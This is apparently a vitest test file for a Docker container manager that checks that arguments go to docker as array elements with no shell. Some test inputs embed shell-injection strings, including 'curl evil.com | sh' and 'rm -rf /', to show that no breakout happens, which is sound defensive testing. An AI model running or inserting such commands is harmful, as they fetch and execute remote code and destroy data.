/**
 * Tests for ContainerManager
 */

import { beforeEach, describe, expect, it, vi } from 'vitest';

import { ContainerManager } from './container-manager';

const mockExecute = vi.fn();
vi.mock('utils/safe-exec', () => ({
	SafeExecutor: {
		execute: (...args: unknown[]) => mockExecute(...args)
	}
}));

vi.mock('output/logger', () => ({
	getLogger: () => ({
		debug: vi.fn(),
		error: vi.fn(),
		info: vi.fn(),
		warn: vi.fn()
	})
}));

function queueExecuteResult(stdout: string, stderr = ''): void {
	mockExecute.mockResolvedValueOnce({ exitCode: 0, stderr, stdout });
}

function queueExecuteError(message: string): void {
	mockExecute.mockRejectedValueOnce(new Error(message));
}

describe('ContainerManager', () => {
	let manager: ContainerManager;

	beforeEach(() => {
		vi.clearAllMocks();
		manager = new ContainerManager();
	});

	describe('createContainer', () => {
		it('passes docker run as an array-form command with no shell interpolation of the environment', async () => {
			// The exploration <task> argument flows into environment.TASK — a
			// task string containing a quote and shell metacharacters must not
			// be able to break out of a constructed shell command, because there
			// is no shell command being constructed at all.
			queueExecuteResult('container123\n');

			await manager.createContainer({
				container_name: 'exp-container',
				cpu_limit: '1',
				environment: { TASK: 'foo" ; curl evil.com | sh #' },
				image: 'alpine',
				memory_limit: '512m',
				shared_volume_path: '/shared',
				worktree_path: '/worktree'
			});

			expect(mockExecute).toHaveBeenCalledWith(
				'docker',
				expect.arrayContaining(['-e', 'TASK=foo" ; curl evil.com | sh #'])
			);
			const [, args] = mockExecute.mock.calls[0] as [string, string[]];
			expect(args).toContain('run');
			expect(args.every((arg) => typeof arg === 'string')).toBe(true);
		});

		it('returns the trimmed container id from stdout', async () => {
			queueExecuteResult('abc123def456\n');

			const id = await manager.createContainer({
				container_name: 'exp-container',
				cpu_limit: '1',
				environment: {},
				image: 'alpine',
				memory_limit: '512m',
				shared_volume_path: '/shared',
				worktree_path: '/worktree'
			});

			expect(id).toBe('abc123def456');
		});

		it('wraps failures in a descriptive error', async () => {
			queueExecuteError('Command failed with exit code 1: no such image');

			await expect(
				manager.createContainer({
					container_name: 'exp-container',
					cpu_limit: '1',
					environment: {},
					image: 'nonexistent',
					memory_limit: '512m',
					shared_volume_path: '/shared',
					worktree_path: '/worktree'
				})
			).rejects.toThrow(/Failed to create container/);
		});
	});

	describe('removeContainer', () => {
		it('retries and succeeds when docker transiently reports removal already in progress', async () => {
			queueExecuteError(
				'Command failed with exit code 1: Error response from daemon: removal of container my-container is already in progress'
			);
			queueExecuteResult('');

			await expect(manager.removeContainer('my-container')).resolves.toBeUndefined();
			expect(mockExecute).toHaveBeenCalledTimes(2);
		});

		it('does not retry when the container does not exist', async () => {
			queueExecuteError(
				'Command failed with exit code 1: Error response from daemon: No such container: missing-container'
			);

			await expect(manager.removeContainer('missing-container')).resolves.toBeUndefined();
			expect(mockExecute).toHaveBeenCalledTimes(1);
		});

		it('throws after exhausting retries when removal never completes', async () => {
			const message =
				'Command failed with exit code 1: Error response from daemon: removal of container stuck-container is already in progress';
			queueExecuteError(message);
			queueExecuteError(message);
			queueExecuteError(message);

			await expect(manager.removeContainer('stuck-container')).rejects.toThrow(/already in progress/);
			expect(mockExecute).toHaveBeenCalledTimes(3);
		});

		it('passes the container name as its own array element, not interpolated into a command string', async () => {
			queueExecuteResult('');

			await manager.removeContainer('exp-container"; rm -rf / #', true);

			expect(mockExecute).toHaveBeenCalledWith('docker', ['rm', '-f', 'exp-container"; rm -rf / #']);
		});
	});

	describe('execInContainer', () => {
		it('passes the command array unchanged, with no shell involved', async () => {
			queueExecuteResult('output\n');

			await manager.execInContainer('exp-container', ['echo', 'hello; rm -rf /']);

			expect(mockExecute).toHaveBeenCalledWith('docker', ['exec', 'exp-container', 'echo', 'hello; rm -rf /']);
		});
	});

	describe('killContainer', () => {
		it('passes the signal as its own array element', async () => {
			queueExecuteResult('');

			await manager.killContainer('exp-container', 'SIGTERM');

			expect(mockExecute).toHaveBeenCalledWith('docker', ['kill', '-s', 'SIGTERM', 'exp-container']);
		});

		it('marks the tracked container as exited on success', async () => {
			queueExecuteResult('container123\n');
			await manager.createContainer({
				container_name: 'exp-container',
				cpu_limit: '1',
				environment: {},
				image: 'alpine',
				memory_limit: '512m',
				shared_volume_path: '/shared',
				worktree_path: '/worktree'
			});
			queueExecuteResult('');

			await manager.killContainer('exp-container');

			expect(manager.getTrackedContainers()[0]?.status).toBe('exited');
		});

		it('swallows "No such container" rather than throwing', async () => {
			queueExecuteError('Command failed with exit code 1: Error response from daemon: No such container: missing');

			await expect(manager.killContainer('missing')).resolves.toBeUndefined();
		});

		it('rethrows other failures wrapped with context', async () => {
			queueExecuteError('Command failed with exit code 1: daemon unavailable');

			await expect(manager.killContainer('exp-container')).rejects.toThrow(/Failed to kill container/);
		});
	});

	describe('stopContainer', () => {
		it('marks the tracked container as exited on success', async () => {
			queueExecuteResult('container123\n');
			await manager.createContainer({
				container_name: 'exp-container',
				cpu_limit: '1',
				environment: {},
				image: 'alpine',
				memory_limit: '512m',
				shared_volume_path: '/shared',
				worktree_path: '/worktree'
			});
			queueExecuteResult('');

			await manager.stopContainer('exp-container', 10);

			expect(mockExecute).toHaveBeenCalledWith('docker', ['stop', '-t', '10', 'exp-container'], expect.any(Object));
			expect(manager.getTrackedContainers()[0]?.status).toBe('exited');
		});

		it('swallows "No such container" and "is not running" rather than throwing', async () => {
			queueExecuteError('Command failed with exit code 1: Error response from daemon: No such container: missing');
			await expect(manager.stopContainer('missing')).resolves.toBeUndefined();

			queueExecuteError('Command failed with exit code 1: Error response from daemon: container is not running');
			await expect(manager.stopContainer('exp-container')).resolves.toBeUndefined();
		});

		it('rethrows other failures wrapped with context', async () => {
			queueExecuteError('Command failed with exit code 1: daemon unavailable');

			await expect(manager.stopContainer('exp-container')).rejects.toThrow(/Failed to stop container/);
		});
	});

	describe('getContainerStatus', () => {
		it('parses status, exit code, and timestamps from docker inspect output', async () => {
			queueExecuteResult('exited|1|2026-01-01T00:00:00Z|2026-01-01T00:05:00Z');
			queueExecuteResult('sha256:abc123\n');

			const info = await manager.getContainerStatus('exp-container');

			expect(info).toEqual({
				container_id: 'sha256:abc123',
				container_name: 'exp-container',
				exit_code: 1,
				finished_at: '2026-01-01T00:05:00Z',
				started_at: '2026-01-01T00:00:00Z',
				status: 'exited'
			});
		});

		it('omits exit_code/timestamps that are still at their zero-value sentinels', async () => {
			queueExecuteResult('running|0|0001-01-01T00:00:00Z|0001-01-01T00:00:00Z');
			queueExecuteResult('sha256:abc123\n');

			const info = await manager.getContainerStatus('exp-container');

			expect(info.exit_code).toBeUndefined();
			expect(info.started_at).toBeUndefined();
			expect(info.finished_at).toBeUndefined();
		});

		it('wraps failures in a descriptive error', async () => {
			queueExecuteError('Command failed with exit code 1: No such container');

			await expect(manager.getContainerStatus('missing')).rejects.toThrow(/Failed to get container status/);
		});
	});

	describe('getContainerStats', () => {
		it('parses CPU percentage and converts memory usage (MiB/GiB) to MB', async () => {
			queueExecuteResult('exp-container|15.5%|256MiB / 2GiB');
			queueExecuteResult('running|0|2026-01-01T00:00:00Z|0001-01-01T00:00:00Z');
			queueExecuteResult('sha256:abc123\n');

			const stats = await manager.getContainerStats('exp-container', 0);

			expect(stats.cpu_usage_percent).toBe(15.5);
			expect(stats.memory_usage_mb).toBe(256);
			expect(stats.memory_limit_mb).toBe(2048);
			expect(stats.status).toBe('running');
			expect(stats.worktree_index).toBe(0);
		});

		it('maps a non-running, non-exited docker status to "stopped"', async () => {
			queueExecuteResult('exp-container|0%|0MiB / 0MiB');
			queueExecuteResult('paused|0|2026-01-01T00:00:00Z|0001-01-01T00:00:00Z');
			queueExecuteResult('sha256:abc123\n');

			const stats = await manager.getContainerStats('exp-container', 0);

			expect(stats.status).toBe('stopped');
		});

		it('wraps failures in a descriptive error', async () => {
			queueExecuteError('Command failed with exit code 1: no such container');

			await expect(manager.getContainerStats('missing', 0)).rejects.toThrow(/Failed to get container stats/);
		});
	});

	describe('getContainerLogs', () => {
		it('passes the requested tail count and returns raw stdout', async () => {
			queueExecuteResult('log line 1\nlog line 2\n');

			const logs = await manager.getContainerLogs('exp-container', 50);

			expect(mockExecute).toHaveBeenCalledWith('docker', ['logs', '--tail', '50', 'exp-container']);
			expect(logs).toBe('log line 1\nlog line 2\n');
		});

		it('wraps failures in a descriptive error', async () => {
			queueExecuteError('Command failed with exit code 1: no such container');

			await expect(manager.getContainerLogs('missing')).rejects.toThrow(/Failed to get logs/);
		});
	});

	describe('containerExists', () => {
		it('returns true when docker inspect succeeds', async () => {
			queueExecuteResult('[{}]');

			await expect(manager.containerExists('exp-container')).resolves.toBe(true);
		});

		it('returns false when docker inspect fails, without throwing', async () => {
			queueExecuteError('Command failed with exit code 1: No such container');

			await expect(manager.containerExists('missing')).resolves.toBe(false);
		});
	});

	describe('waitForContainer', () => {
		it('parses the exit code from stdout', async () => {
			queueExecuteResult('0\n');

			await expect(manager.waitForContainer('exp-container')).resolves.toBe(0);
			expect(mockExecute).toHaveBeenCalledWith('docker', ['wait', 'exp-container'], expect.any(Object));
		});

		it('passes an explicit timeout as its own docker flag', async () => {
			queueExecuteResult('1\n');

			await manager.waitForContainer('exp-container', 60);

			expect(mockExecute).toHaveBeenCalledWith('docker', ['wait', '-t', '60', 'exp-container'], expect.any(Object));
		});

		it('wraps failures in a descriptive error', async () => {
			queueExecuteError('Command failed with exit code 1: no such container');

			await expect(manager.waitForContainer('missing')).rejects.toThrow(/Failed to wait for container/);
		});
	});

	describe('pullImageIfNeeded', () => {
		it('returns false without pulling when the image already exists locally', async () => {
			queueExecuteResult('[{}]');

			await expect(manager.pullImageIfNeeded('alpine')).resolves.toBe(false);
			expect(mockExecute).toHaveBeenCalledTimes(1);
			expect(mockExecute).toHaveBeenCalledWith('docker', ['image', 'inspect', 'alpine']);
		});

		it('pulls and returns true when the image does not exist locally', async () => {
			queueExecuteError('Command failed with exit code 1: no such image');
			queueExecuteResult('');

			await expect(manager.pullImageIfNeeded('alpine')).resolves.toBe(true);
			expect(mockExecute).toHaveBeenCalledWith('docker', ['pull', 'alpine'], expect.any(Object));
		});

		it('wraps a failed pull in a descriptive error', async () => {
			queueExecuteError('Command failed with exit code 1: no such image');
			queueExecuteError('Command failed with exit code 1: network unreachable');

			await expect(manager.pullImageIfNeeded('alpine')).rejects.toThrow(/Failed to pull image/);
		});
	});

	describe('pauseContainer / unpauseContainer', () => {
		it('marks a tracked container as paused, then running again on unpause', async () => {
			queueExecuteResult('container123\n');
			await manager.createContainer({
				container_name: 'exp-container',
				cpu_limit: '1',
				environment: {},
				image: 'alpine',
				memory_limit: '512m',
				shared_volume_path: '/shared',
				worktree_path: '/worktree'
			});
			queueExecuteResult('');
			await manager.pauseContainer('exp-container');
			expect(manager.getTrackedContainers()[0]?.status).toBe('paused');

			queueExecuteResult('');
			await manager.unpauseContainer('exp-container');
			expect(manager.getTrackedContainers()[0]?.status).toBe('running');
		});

		it('wraps pause/unpause failures in a descriptive error', async () => {
			queueExecuteError('Command failed with exit code 1: no such container');
			await expect(manager.pauseContainer('missing')).rejects.toThrow(/Failed to pause container/);

			queueExecuteError('Command failed with exit code 1: no such container');
			await expect(manager.unpauseContainer('missing')).rejects.toThrow(/Failed to unpause container/);
		});
	});

	describe('tracked-container bookkeeping', () => {
		it('tracks a created container and forgets it via untrackContainer', async () => {
			queueExecuteResult('container123\n');
			await manager.createContainer({
				container_name: 'exp-container',
				cpu_limit: '1',
				environment: {},
				image: 'alpine',
				memory_limit: '512m',
				shared_volume_path: '/shared',
				worktree_path: '/worktree'
			});

			expect(manager.getTrackedContainers().map((c) => c.container_name)).toEqual(['exp-container']);

			manager.untrackContainer('exp-container');

			expect(manager.getTrackedContainers()).toEqual([]);
		});

		it('clearTracking() forgets every tracked container', async () => {
			queueExecuteResult('c1\n');
			await manager.createContainer({
				container_name: 'exp-1',
				cpu_limit: '1',
				environment: {},
				image: 'alpine',
				memory_limit: '512m',
				shared_volume_path: '/shared',
				worktree_path: '/worktree'
			});
			queueExecuteResult('c2\n');
			await manager.createContainer({
				container_name: 'exp-2',
				cpu_limit: '1',
				environment: {},
				image: 'alpine',
				memory_limit: '512m',
				shared_volume_path: '/shared',
				worktree_path: '/worktree'
			});

			manager.clearTracking();

			expect(manager.getTrackedContainers()).toEqual([]);
		});
	});

	describe('multi-container operations', () => {
		it('createMultipleContainers creates every container in parallel', async () => {
			queueExecuteResult('c1\n');
			queueExecuteResult('c2\n');

			const ids = await manager.createMultipleContainers([
				{
					container_name: 'exp-1',
					cpu_limit: '1',
					environment: {},
					image: 'alpine',
					memory_limit: '512m',
					shared_volume_path: '/shared',
					worktree_path: '/worktree'
				},
				{
					container_name: 'exp-2',
					cpu_limit: '1',
					environment: {},
					image: 'alpine',
					memory_limit: '512m',
					shared_volume_path: '/shared',
					worktree_path: '/worktree'
				}
			]);

			expect(ids.sort()).toEqual(['c1', 'c2']);
		});

		it('removeMultipleContainers removes every named container', async () => {
			queueExecuteResult('');
			queueExecuteResult('');

			await manager.removeMultipleContainers(['exp-1', 'exp-2'], true);

			expect(mockExecute).toHaveBeenCalledWith('docker', ['rm', '-f', 'exp-1']);
			expect(mockExecute).toHaveBeenCalledWith('docker', ['rm', '-f', 'exp-2']);
		});
	});
});
